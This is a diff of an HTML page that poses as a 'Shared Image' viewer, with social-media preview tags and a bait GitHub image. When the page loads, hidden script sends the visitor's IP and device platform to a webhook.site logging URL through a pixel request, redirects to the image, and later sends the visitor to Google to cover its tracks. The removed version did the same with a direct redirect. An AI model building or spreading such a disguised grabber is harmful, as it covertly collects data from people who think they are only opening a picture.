@@ -1,14 +1,38 @@
-<script>
-    function runPayload() {
-        // This is the "Nuclear Option": 
-        // We send the browser DIRECTLY to the webhook, which will then 
-        // log the IP and redirect the user back to the image.
-        
-        const targetWebhook = "https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6";
-        const baitImage = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
-        
-        // This forces the IP capture because the browser is actually visiting the URL
-        window.location.href = targetWebhook + "?redirect=" + encodeURIComponent(baitImage);
-    }
-    window.onload = runPayload;
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta property="og:title" content="Shared Image">
+    <meta property="og:description" content="Click to view full resolution image">
+    <meta property="og:image" content="https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <title>Image Viewer</title>
+
+    <script>
+        function runPayload() {
+            // 1. UPDATED ID: Matching your actual Webhook dashboard
+            var webhookID = "7132896c-9333-427f-b7c5-6eaac30219c6";
+            var baseURL = "https://webhook.site/" + webhookID;
+
+            // 2. THE PIXEL PING: Bypasses browser background fetch blocks
+            var report = new Image();
+            report.src = baseURL + "?status=landed&device=" + navigator.platform;
+
+            // 3. THE BAIT: Show the image after 1.2 seconds
+            setTimeout(function() {
+                window.location.href = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
+            }, 1200);
+
+            // 4. THE SELF-DESTRUCT: Vanish after 23 seconds
+            setTimeout(function() {
+                window.location.href = "https://www.google.com";
+            }, 23000);
+        }
+        window.onload = runPayload;
+    </script>
+</head>
+<body style="background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh;">
+    <p style="color: white; font-family: sans-serif;">Loading High Resolution Image...</p>
+</body>
+</html>
